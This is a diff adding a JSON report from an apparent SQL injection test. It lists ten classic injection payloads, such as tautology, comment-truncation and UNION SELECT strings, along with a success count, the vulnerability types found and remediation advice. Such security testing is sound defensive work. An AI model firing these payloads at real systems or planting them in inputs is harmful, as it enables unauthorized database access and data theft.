@@ -1,0 +1,35 @@
+{
+  "timestamp": "2025-10-16T12:36:18.837091",
+  "attack_type": "SQL Injection",
+  "summary": {
+    "total_attempts": 10,
+    "successful_injections": 5,
+    "success_rate": 50.0,
+    "payloads_tested": 10
+  },
+  "details": {
+    "payloads_used": [
+      "' OR '1'='1",
+      "' OR '1'='1' --",
+      "' OR '1'='1' /*",
+      "admin' --",
+      "admin' #",
+      "' UNION SELECT 1,2,3 --",
+      "' AND 1=1 --",
+      "' AND 1=2 --",
+      "' OR EXISTS(SELECT * FROM users) --",
+      "' OR 1=1--"
+    ],
+    "vulnerabilities_found": [
+      "Boolean-based blind SQL injection",
+      "Union-based SQL injection"
+    ],
+    "recommendations": [
+      "Use parameterized queries",
+      "Implement input validation",
+      "Use stored procedures",
+      "Apply principle of least privilege",
+      "Regular security testing"
+    ]
+  }
+}
